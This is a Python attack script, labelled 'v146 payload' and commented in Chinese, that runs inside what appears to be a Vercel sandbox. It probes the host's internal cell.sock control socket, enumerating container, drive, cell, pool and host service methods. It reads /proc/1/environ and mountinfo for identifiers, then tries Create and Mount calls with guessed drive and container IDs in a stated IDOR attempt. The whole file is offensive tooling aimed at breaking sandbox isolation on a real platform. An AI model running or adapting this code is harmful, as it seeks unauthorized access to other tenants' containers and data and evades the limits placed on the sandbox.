# -*- coding: utf-8 -*-
"""v146 payload: 用验证过的 raw_req 格式系统性枚举 cell.sock 全部服务方法
+ Create drive_id 变体测试 (IDOR 方向)
输出 /vercel/sandbox/v146c.out"""
import socket, struct, time, json, os, signal, re

OUT = '/vercel/sandbox/v146c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(290)

CELL = '/run/cell/cell.sock'
IMG = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def raw_req(sockpath, path, body, t=4.0, ctype='application/json'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        status = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        return status, d[hdr_end + 4:hdr_end + 4 + 400] if hdr_end > 0 else b''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def dechunk(d):
    out = b''
    off = 0
    while off < len(d):
        i = d.find(b'\r\n', off)
        if i < 0:
            break
        try:
            ln = int(d[off:i].split(b';')[0], 16)
        except Exception:
            break
        if ln == 0:
            break
        out += d[i + 2:i + 2 + ln]
        off = i + 2 + ln + 2
    return out


# 1: 全服务×方法枚举
log('=== 1 enumerate ===')
SERVICES = {
    'CTRS': ('vercel.hive.cell.api.containers.v1.ContainersService',
             ['Create', 'Start', 'Exec', 'Kill', 'Wait', 'Mount', 'Stdin', 'StreamOutput', 'List', 'Get', 'Stop']),
    'PROC': ('vercel.hive.cell.api.processes.v1.ProcessService',
             ['Start', 'Exec', 'Kill', 'Wait', 'StreamOutput', 'List', 'Get']),
    'USAGE': ('vercel.hive.cell.api.usage.v1.UsageService',
              ['GetResourceUsage', 'List', 'Get']),
    'DRV': ('vercel.hive.cell.api.drives.v1.DrivesService',
            ['CreateSnapshot', 'SetOCIImageConfig', 'GetOCIImageConfig', 'AttachDrive', 'DetachDrive',
             'GetDriveUsage', 'Mount', 'Unmount', 'Create', 'Delete', 'List']),
    'CELLS': ('vercel.hive.api.cells.v1.CellsService',
              ['StartCell', 'StopCell', 'RunCell', 'PoolCell', 'GetCellAddress', 'IsCellAlive',
               'ExtendPorts', 'EnableSnapshotOnShutdown', 'List', 'Get']),
    'POOL': ('vercel.hive.api.pools.v1.PoolsService',
             ['PutPool', 'GetPool', 'DeletePool', 'List']),
    'CELD': ('vercel.hive.celld.api.v1.CelldService',
             ['Configure', 'SetWorkload', 'Heartbeat', 'Shutdown', 'StartContainer', 'StopContainer',
              'WaitContainer', 'GetDriveStorageUsage']),
    'HOST': ('vercel.hive.host.api.v1.HostService',
             ['CreateSnapshot', 'GetResourceUsage', 'GetProxyCertificates', 'GetOCIImageConfig',
              'SetOCIImageConfig', 'WaitForDrive']),
}
for tag, (svc, methods) in SERVICES.items():
    for m in methods:
        st, pay = raw_req(CELL, '%s/%s' % (svc, m), b'{}', t=2)
        if '404' in st:
            continue
        log('HIT %s/%s -> %s %r' % (tag, m, st, pay[:250]))

# 2: Create drive_id 变体
log('=== 2 Create variants ===')
# 找我们自己的 drive_id: 从 env / mountinfo / containerd config
cands = []
try:
    for ln in open('/proc/self/mountinfo', errors='replace'):
        if 'vdb' in ln or 'drives' in ln:
            cands.append(ln.strip()[:200])
except Exception:
    pass
for c in cands:
    log('mountinfo: %s' % c)
try:
    for ln in open('/proc/1/environ', 'rb').read().split(b'\x00'):
        if b'drive' in ln.lower() or b'vdb' in ln.lower() or b'cell' in ln.lower():
            log('pid1 env: %r' % ln[:200])
except Exception:
    pass
# 尝试常见 drive_id 格式
variants = [
    {'drive_id': 'hvc_iad1_b01540a2_c3c0bfbabd8f4e0098265e29a3808e11'},
    {'drive_id': 'b01540a2-c3c0-bfab-d8f4-e0098265e29a'},
    {'drive_id': 'ctr_a929009e2ad44b03be26495b1583'},
    {'image': IMG, 'drive_id': 'hvc_iad1_b01540a2_c3c0bfbabd8f4e0098265e29a3808e11'},
    {'drive_id': 'root'},
    {'drive_id': 'vdb'},
    {'drive_id': '/dev/vdb'},
    {'drive_id': ''},
    {'drive_id': 'hvc_iad1_b01540a2'},
]
for v in variants:
    st, pay = raw_req(CELL, '/vercel.hive.cell.api.containers.v1.ContainersService/Create',
                      json.dumps(v).encode(), t=3)
    log('Create %r -> %s %r' % (v, st, pay[:300]))

# 3: Mount 变体
log('=== 3 Mount variants ===')
for v in [{'drive_id': 'hvc_iad1_b01540a2_c3c0bfbabd8f4e0098265e29a3808e11'},
          {'container_id': 'ctr_a929009e2ad44b03be26495b1583'},
          {'containerId': 'ctr_a929009e2ad44b03be26495b1583', 'path': '/'},
          {'target': '/'}]:
    st, pay = raw_req(CELL, '/vercel.hive.cell.api.containers.v1.ContainersService/Mount',
                      json.dumps(v).encode(), t=3)
    log('Mount %r -> %s %r' % (v, st, pay[:250]))

# 4: grpc+json / grpc+proto 协议对比 (有 5 字节前缀的 gRPC)
log('=== 4 grpc proto ===')
def grpc_req(path, proto_body, t=4):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(CELL)
        body = b'\x00' + struct.pack('>I', len(proto_body)) + proto_body
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/grpc\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n' % (path, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        return st, d[hdr_end + 4:hdr_end + 4 + 300] if hdr_end > 0 else b''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''

st, pay = grpc_req('/vercel.hive.cell.api.usage.v1.UsageService/GetResourceUsage', b'')
log('GRPC GetResourceUsage -> %s %r' % (st, pay[:200]))
# proto: UsageService GetResourceUsage 请求消息可能为空
st, pay = grpc_req('/vercel.hive.cell.api.containers.v1.ContainersService/Create',
                   json.dumps({'image': IMG}).encode())
log('GRPC Create(image) json-in-grpc -> %s %r' % (st, pay[:200]))
# 尝试 StreamOutput 的 grpc (unary?)
st, pay = grpc_req('/vercel.hive.cell.api.processes.v1.ProcessService/StreamOutput', b'')
log('GRPC StreamOutput -> %s %r' % (st, pay[:200]))

log('V146_DONE')
f.close()
